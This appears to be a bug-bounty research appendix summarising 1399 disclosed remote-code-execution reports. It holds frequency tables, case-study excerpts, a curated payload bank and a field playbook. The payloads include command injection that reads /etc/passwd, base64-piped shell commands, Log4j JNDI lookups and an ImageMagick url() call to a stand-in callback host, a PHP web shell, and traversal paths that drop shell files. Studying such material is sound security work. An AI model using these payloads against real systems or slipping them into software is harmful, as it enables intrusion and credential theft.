# Evidence appendix — Remote Code / Command Execution

Mined from all **1399 valid disclosed reports** for this class (338 paid, 24% — payment is not validity).

## Technique frequency (all valid writeups)

| Item | Count |
|---|---:|
| public source-code / repo review | 393 |
| internal service / port / container | 221 |
| file upload / filename / extension | 220 |
| HTTP method / verb tampering | 200 |
| admin / privileged-role context | 188 |
| encoding / double-encode / null byte | 159 |
| WAF / sanitizer / filter bypass | 153 |
| race / concurrency / timing | 130 |
| Content-Type / body-format switch | 119 |
| cache / CDN / unkeyed header | 100 |
| header injection (Host / X-Forwarded / etc.) | 95 |
| error message / stack trace probing | 92 |
| XML / SOAP / SAML / XXE | 88 |
| parser confusion / normalization | 73 |
| parameter pollution / duplicate keys | 70 |
| JS bundle / source-map inspection | 62 |
| subdomain / DNS / cert-transparency recon | 62 |
| unauthenticated / removed-cookie test | 61 |
| OAST / DNS / HTTP callback proof | 54 |
| deserialization / gadget chain | 54 |
| webhook / OAuth / SAML / integration abuse | 53 |
| DOM / HTML source inspection | 52 |
| JWT / token / base64 decode | 51 |
| intercept & replay request in Burp | 50 |
| second-order / stored / blind delivery | 47 |
| git history / exposed .git | 44 |
| third-party data / paste / breach reuse | 42 |
| API docs / Swagger / introspection | 41 |
| two-account / cross-account replay | 40 |
| fuzzing / wordlist brute force | 39 |
| verbose debug / framework fingerprint | 36 |
| cloud metadata / IAM abuse | 30 |
| template injection (SSTI) | 26 |
| employee / developer public info | 21 |
| replay / modify a captured request | 17 |
| browser DevTools / network tab | 12 |
|  HosT/absolute-URL reset poisoning | 11 |
| public bucket / storage exposure | 11 |
| redirect chain / Location header | 11 |
| mass assignment / extra request fields | 11 |
| response diff / status / length comparison | 9 |
| search-engine dorking | 6 |
| swap object ID / parameter value | 5 |
| archive / Wayback endpoint discovery | 3 |

## Tools mentioned

| Item | Count |
|---|---:|
| source-code-review | 323 |
| curl | 155 |
| git | 111 |
| browser | 106 |
| python | 91 |
| javascript-debugging | 72 |
| devtools | 60 |
| burp | 59 |
| burp-repeater | 18 |
| collaborator/oast | 12 |
| burp-collaborator | 10 |
| burp-intruder | 9 |
| nmap | 4 |
| jq | 4 |
| interactsh | 3 |
| zap | 2 |
| beautifier | 2 |
| shodan | 2 |
| nuclei | 2 |
| decompiler | 1 |

## Bypass primitives

| Item | Count |
|---|---:|
| content-type | 199 |
| bypass | 145 |
| %0d%0a | 53 |
| bypassed | 40 |
| whitelist | 31 |
| blacklist | 25 |
| bypassing | 21 |
| blind | 19 |
| bypasses | 19 |
| host header | 19 |
| unicode | 14 |
| null byte | 11 |
| transfer-encoding | 11 |
| allowlist | 9 |
| %00 | 8 |
| chunked | 8 |
| open redirect | 8 |
| normalizer | 8 |
| race condition | 7 |
| crlf | 7 |
| backslash | 7 |
| lowercase | 6 |
| type confusion | 6 |
| normalization | 6 |
| url encoded | 5 |
| normalized | 5 |
| trailing dot | 5 |
| normalize | 4 |

## Impact language

| Item | Count |
|---|---:|
| admin | 435 |
| token | 353 |
| rce | 336 |
| password | 300 |
| remote code execution | 178 |
| secret | 163 |
| credential | 148 |
| localhost | 133 |
| arbitrary code | 110 |
| arbitrary command | 105 |
| arbitrary file | 33 |
| api key | 31 |
| sensitive information | 26 |
| privilege escalation | 24 |
| unauthorized | 23 |
| exfiltrate | 18 |
| payment | 18 |
| sensitive data | 15 |
| exfiltration | 14 |
| account takeover | 13 |

## Parameters observed

| Item | Count |
|---|---:|
| mrb | 109 |
| entry | 83 |
| proc | 54 |
| self | 39 |
| class | 35 |
| src | 32 |
| argc | 32 |
| href | 26 |
| name | 26 |
| argv | 26 |
| version | 20 |
| stack_keep | 19 |
| charset | 17 |
| type | 17 |
| value | 17 |
| shell | 16 |
| max-age | 15 |
| encoding | 13 |
| nil | 12 |
| syms | 11 |
| url | 10 |
| alt | 10 |
| str | 10 |
| len | 10 |
| action | 10 |
| concept | 10 |
| nregs | 10 |
| mid | 9 |
| size | 9 |
| obj | 9 |

## Recurring approach patterns

- **4×** this is achieved by simply sending a request that looks like below
  - e.g. This is achieved by simply sending a request that looks like below.
- **3×** worse yet by exposing kaspersky s internal processing to the web bugs in this processing code will turn into remote code execution vulnerabilities allowing websites to execute code with the privileges of the system user i haven t explored this possibility further
  - e.g. Worse yet: by exposing Kaspersky's internal processing to the web, bugs in this processing code will turn into Remote Code Execution vulnerabilities allowing websites to execute code with the privileges of the SYSTEM user (I haven't explored this possibility further).
- **2×** i was able to take control of this ip address and run my own ec2 instance
  - e.g. I was able to take control of this IP address and run my own EC2 instance.
- **2×** this vulnerability is in fact an cache poisoning in the ground which makes it possible to not harm the system in any way when testing
  - e.g. This vulnerability is in fact an Cache poisoning [2] in the ground which makes it possible to not harm the system in any way when testing.
- **2×** in the case of a popular streamer it opens them up to ddos attacks by just clicking on a safe tweet
  - e.g. In the case of a popular streamer it opens them up to DDOS attacks by just clicking on a "safe" tweet.
- **2×** i found that one of the targets belongs to dod vulnerable to cve where an attacker may be able to execute any malicious code like escalating remote code execution is also possible technical summary cve is a server side template injection vulnerability in the vmware workspace one access and identity manager
  - e.g. I found that one of the targets belongs to **DOD** vulnerable to **CVE-2022-22954** where an attacker may be able to execute any malicious code like escalating Remote code execution is also possible **Technical Summary:** CVE-2022-22954 is a server-side template injection vulnerability in the VMware
- **2×** an unauthenticated attacker with network access could exploit this vulnerability by sending a specially crafted request to a vulnerable vmware workspace one or identity manager
  - e.g. An unauthenticated attacker with network access could exploit this vulnerability by sending a specially crafted request to a vulnerable VMware Workspace ONE or Identity Manager.
- **2×** using the dockerhub image the entire server is completely unavailable by repeatedly sending a small number of requests repeatedly
  - e.g. Using the DockerHub image, the entire server is completely unavailable by repeatedly sending a small number of requests repeatedly.
- **2×** the fix can be bypassed either by sending a disallowed but otherwise valid plugin identifier as type or using the ox setchanneltargeting xml rpc api method
  - e.g. The fix can be bypassed either by sending a disallowed but otherwise valid plugin identifier as `type`, or using the `ox.setChannelTargeting` XML-RPC API method.
- **1×** hey guys i just found a way to make your service timeout
  - e.g. Hey guys, I just found a way to make your service timeout.
- **1×** as attachments i sent three foto s of your service timing out had to be sure it was my image and the image with the spoofed pixels
  - e.g. As attachments I sent three foto's of your service timing out (had to be sure it was my image), and the image with the 'spoofed' pixels.
- **1×** as attachments i sent the file composed of 40k images and a screenshot of the timeout
  - e.g. As attachments I sent the file composed of 40k images, and a screenshot of the timeout.
- **1×** from the zlib tech details the test case was a 50mb file filled with zeros it compressed to roughly kb i used this to store a huge amount of data in a small png smaller than mb
  - e.g. From the zlib [tech] details: "The test case was a 50MB file filled with zeros; it compressed to roughly 49 KB" I used this to store a huge amount of data in a small PNG (smaller than 1 MB).
- **1×** i think it s because paperclip tried to identify and convert my image again
  - e.g. I think it's because Paperclip tried to `identify` and `convert` my image again.
- **1×** as a attachment i sent the python code i made to create the png and the png itself
  - e.g. As a attachment I sent the Python code I made to create the PNG, and the PNG itself.
- **1×** other data chunks may be exploitable but i haven t looked into them yet
  - e.g. Other data chunks may be exploitable, but I haven't looked into them yet.
- **1×** the author of this parser was even aware of its hackishness as you can see from the error message contained in the code however the actual problem of the code should become obvious when you read the rest of the parsing code that attempts to first duplicate the timestamp string and then parses the timestamp by going through the copy in reverse order and writing five nul bytes into the duplicated string
  - e.g. The author of this parser was even aware of its hackishness as you can see from the error message contained in the code: However the actual problem of the code should become obvious when you read the rest of the parsing code that attempts to first duplicate the timestamp string and then parses the t
- **1×** because of php s deterministic heap memory layout that can be controlled a lot by sending e g
  - e.g. Because of PHP's deterministic heap memory layout that can be controlled a lot by sending e.g.
- **1×** i found all these issues in ms dos
  - e.g. I found all these issues in MS-DOS.
- **1×** this vulnerability can be remotely exploited by attackers to mount denial of service attacks by sending highly compressed xml elements over xmpp streams
  - e.g. This vulnerability can be remotely exploited by attackers to mount Denial-of-Service attacks by sending highly-compressed XML elements over XMPP streams.
- **1×** i used these two attacks to confirm the vulnerability on implementations prosody openfire and tigase server
  - e.g. I used these two attacks to confirm the vulnerability on 3 implementations: Prosody 0.9.3, Openfire 3.9.1, and Tigase server 5.2.0.
- **1×** in all our tests we used xmppbombs of the size of 4mb that amounts to 4gb of uncompressed xmpp message each
  - e.g. In all our tests, we used xmppbombs of the size of 4MB that amounts to 4GB of uncompressed XMPP message each.
- **1×** we found out that prosody and openfire are vulnerable to this attack
  - e.g. We found out that Prosody and Openfire are vulnerable to this attack.
- **1×** at this point i was able to assign a non existing role i changed the dropdown list and chose as value
  - e.g. - At this point I was able to assign a non-existing role (I changed the dropdown list and chose 10 as value).

## Case studies (full excerpts)

### 1679624 — Remote Command Execution via Github import
GitLab · $33510 · critical · https://hackerone.com/reports/1679624

### Summary This is very similar to and allows arbitrary redis commands to be injected when imported a GitHub repository. When importing a GitHub repo the api client uses `Sawyer` for handling the responses. This takes a json hash and converts it into a ruby class that has methods matching all of the keys: This happens recursively, and allows for any method to be overridden including built-in methods such as `to_s`. The redis gem uses `to_s` and `bytesize` to generate the RESP command, so if a `Sawyer::Resource` is ever passed in that has a controllable hash it can allow arbitrary redis commands to be injected into the stream as the string will be shorter than the `$` size provided (see The patch for CVE-2022-2884 added validation to `Gitlab::Cache::Import::Caching` but there is another spot where the `Sawyer::Resource` is passed to redis: The `default_branch` param comes from the client repository (which is a nested Sawyer::Resource of attacker controlled data), and is passed to `change_head` which then calls `branch_exists?` and `branch_names_include?` which passes the value to redis: So by returning an api response with a `default_branch` that overrides `to_s` and `bytesize` you can call arbitrary redis commands: This can be combined with a call to `Marshal.load` when loading a _gitlab_session to execute a deserialisation gadget (such as and gain RCE. ### Steps to reproduce 

### 1609965 — RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag)
GitLab · $33510 · critical · https://hackerone.com/reports/1609965

### Summary The `DecompressedArchiveSizeValidator` is used to check the size of a archive before extracting it: Since `command` is a string and passed directly to `Open3.popen3` it will be interpreted as a shell command, so if `archive_path` contains any special characters it can be used to run arbitrary commands. One of the places that the `DecompressedArchiveSizeValidator` is used is in the [Gitlab::ImportExport::FileImporter]( It gets `@archive_file` from the constructor, and is used by the [Gitlab::ImportExport::Importer]( which gets it from `project.import_source`. Under normal circumstances `import_source` is nil and is generated by the `FileImporter` using `@archive_file = File.join(@shared.archive_path, Gitlab::ImportExport.export_filename(exportable: @importable))`. Most of the places I've checked do not allow you to set the `import_source` for a project, or have the `import_type` set to something other than `gitlab_project` or `gitlab_custom_project_template` (which is required to use the `::Gitlab::ImportExport::Importer`). There is one place though, in the `BulkImports::Projects::Pipelines::ProjectPipeline`. Luckily this is disabled by default as it requires the `bulk_import_projects` feature to be enabled. If/once this feature is enabled, it's possible to trigger the above flow. This is possible as the two transformer on the `ProjectPipeline` are `:BulkImports::Com

### 925585 — RCE via npm misconfig -- installing internal libraries from the public registry
PayPal · $30000 · critical · https://hackerone.com/reports/925585

A Bug Bounty researcher identified an issue where certain development projects defaulted to the public NPM registry, instead of using the intended internal packages. Since the packages on the public registry did not exist, the researcher created these and observed they were downloaded. Had these packages been registered with malicious intent, it is possible for internal development to have included this code. While there are additional checks and controls in the development pipeline, this could have caused significant issues for internal systems. Thanks to the researcher's report, PayPal was able to mitigate the issue with the public registry and confirmed no evidence of prior malicious activity. [Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies](

### 455645 — Exposed Kubernetes API - RCE/Exposed Creds
Snapchat · $25000 · critical · https://hackerone.com/reports/455645

@txt3rob found one of Snaps internal Kubernetes instances exposing an API endpoint without authorization to the public. With access to this API he was able to run arbitrary code/jobs as a cluster-admin and gained access to credentials with internal access to a significant number of instances. During a worldwide kubernetes scan with binaryedge.io i found a K8 exposed internal API endpoint without authorization to the public. With access to this API I was able to run arbitrary code/jobs as a cluster-admin and gained access to credentials with internal access to a significant number of instances.

### 591295 — Potential pre-auth RCE on Twitter VPN
X / xAI · $20160 · critical · https://hackerone.com/reports/591295

Hi, we(Orange Tsai and Meh Chang) are the security research team from DEVCORE. Recently, we are doing a research about SSL VPN security, and found several critical vulnerabilities on Pulse Secure SSL VPN! We have reported to vendor and [patches]( have been released on `2019/4/25`. Since that, we keep monitoring numerous large corporations using Pulse Secure and we noticed that Twitter haven't patched the SSL VPN server over one month! These vulnerabilities include a pre-auth file reading(CVSS 10) and a post-auth(admin) command injection(CVSS 8.0) which can be chained into a pre-auth RCE! Here are all vulnerabilities we found: * CVE-2019-11510 - Pre-auth Arbitrary File Reading * CVE-2019-11542 - Post-auth Stack Buffer Overflow * CVE-2019-11539 - Post-auth Command Injection * CVE-2019-11538 - Post-auth Arbitrary File Reading * CVE-2019-11508 - Post-auth Arbitrary File Writing * CVE-2019-11540 - Post-auth Session Hijacking ## Our Steps First, we download following files with CVE-2019-11510: 1. `/etc/passwd` 2. `/etc/hosts` 3. `/data/runtime/mtmp/system` 4. `/data/runtime/mtmp/lmdb/dataa/data.mdb` 5. `/data/runtime/mtmp/lmdb/dataa/lock.mdb` 6. `/data/runtime/mtmp/lmdb/randomVal/data.mdb` 7. `/data/runtime/mtmp/lmdb/randomVal/lock.mdb` ██████████ The VPN user and hashed passwords are stored in the file `mtmp/system`. However, Pulse Secure caches the plain-text password in the `dataa

### 422944 — H1514 Remote Code Execution on kitcrm using bulk customer update of Priority Products
Shopify · no bounty (valid finding) · medium · https://hackerone.com/reports/422944

Hi, ### Background kitcrm.com allows the administrator to upload priority product images located at: {F359446} {F359447} These images are not being checked if they are real JPG/PNG/GIF. When uploading an ImageTragick (issue found my Tavis Ormandy) using the following payload (my netcat listener is on `██████████:8080`: Then connecting kitcrm to Facebook Messenger, and writing the following commands to kit: {F359445} {F359443} {F359444} A reverse shell will be created to my host: I can also confirm this is internally for Shopify since the README refers to an internal repo of github.com/Shopify: I also verified I can access AWS metadata: I did try to list S3-buckets, and checked the assumed-role: You should immediately make sure Postscript files cannot be uploaded here, or urgently update or remove Ghostscript from the imagemagick instance. Regards, Frans and Mathias ## Impact #

### 403417 — Remote Code Execution on www.semrush.com/my_reports on Logo upload
Semrush · no bounty (valid finding) · critical · https://hackerone.com/reports/403417

The Logo upload in the report constructor at: {F340480} is passed through a not properly patched version of ImageMagick. You can use Postscript to get Ghostscript to run which in return allows to trigger arbitrary commands on the server, leading to Remote Code Execution. Tavis Ormandy has also mentioned recently that the policy.xml needs to disable EPS,PS,PDF and XPS since all these have ways to trigger Ghostscript: The following PoC-payload was used to get a reverse shell when issuing the upload: Save it as `test.jpg` and upload it as an image for the logo: (`█████` is the IP of my listener) This resulted in: At this point I wasn't sure if this was a third party or not, so I checked two things: ## `██████` to list files in the ██████ dir. It showed me: I navigated to And confirmed those two files exists in this directory. ## `/etc/hosts` This one confirmed it by: I'm certain this is a SEMrush-instance. {F340481} You should urgently make sure your policy.xml for imagemagick ONLY allows gif,jpg,png and nothing else. Regards, Frans ## Impact #

## Full curated payload bank

### Shell metacharacters

```text
;id
|id
||id
&id
&&id
$(id)
`id`
%0aid
%0d%0aid
';id;'
";id;"
|whoami
;cat /etc/passwd
$(cat /etc/passwd)
`cat /etc/passwd`
```

### Space / filter bypass

```text
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat</etc/passwd
c\at /etc/passwd
c'a't /etc/passwd
/bin/cat$IFS/etc/passwd
$(printf '\x69\x64')
echo${IFS}aWQ=|base64${IFS}-d|sh
id%09
id%0a
;id;#
|id|
```

### Argument injection

```text
--output=/tmp/x
-o /tmp/x
--config=/tmp/x
--upload-pack=id
--checkpoint-action=exec=id
-fsSL http://callback/x
--proxy=http://callback:8080
--dump-config
@file
file:///etc/passwd
```

### Expression / template / log4j

```text
${7*7}
{{7*7}}
#{7*7}
<%= 7*7 %>
${jndi:ldap://callback/a}
${jndi:dns://callback/a}
${${::-j}${::-n}${::-d}${::-i}:ldap://callback/a}
{{cycler.__init__.__globals__.os.popen('id').read()}}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<%= system('id') %>
```

### Upload / parser / archive

```text
push graphic-context
viewbox 0 0 640 480
fill 'url(https://callback/x)'
pop graphic-context
<?php system($_GET['c']); ?>
<svg onload=alert(1)>
../../../../var/www/html/shell.php
..\..\..\..\inetpub\wwwroot\shell.aspx
PK../../../../var/www/html/shell.php
```

## Field playbook (unedited)

### quick

- Map sinks: shell exec, eval, template render, image/PDF converters, archive tools, CI runners.
- Use time-based and OOB callbacks, not just output reflection.
- Test argument injection on tools that take filenames/URLs (curl, ffmpeg, git, ImageMagick).
- Check upload -> processing chains (SVG, image, office, archive).
- Look at admin/debug endpoints and internal tooling exposed to users.

### payloads

- Shell -> `;id`, `|id`, `$(id)`, backticks, `%0aid`, newline injection
- Argument -> `--output=/tmp/x`, `-o`, `--config`, `file://`
- Expression -> `${7*7}`, `{{7*7}}`, `#{7*7}`, `<%= 7*7 %>`
- Log4j -> `${jndi:ldap://callback/a}`
- ImageMagick -> `push graphic-context` / `fill 'url(https://callback/x)'`

### bypass

- Blind via DNS/HTTP callback; encode spaces as `${IFS}`, `%09`, `$()`.
- Bypass blocklists with base64, wildcards, quotes, and environment variables.
- Use file-write + include, or log poisoning, when direct exec is blocked.

### surface

- cmd
- exec
- command
- run
- eval
- template
- import
- convert
- render
- filename
- url

### tools

- interactsh
- commix
- ysoserial
- nuclei
- Burp

### chain

- RCE -> cloud creds -> lateral movement.
- Upload + parser -> RCE.
- SSTI -> RCE.

## Corpus search commands

```sh
python3 ~/.local/share/hackerone-reports/h1.py stats --class rce
python3 ~/.local/share/hackerone-reports/h1.py search "<feature or param>" --class rce --limit 10
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```
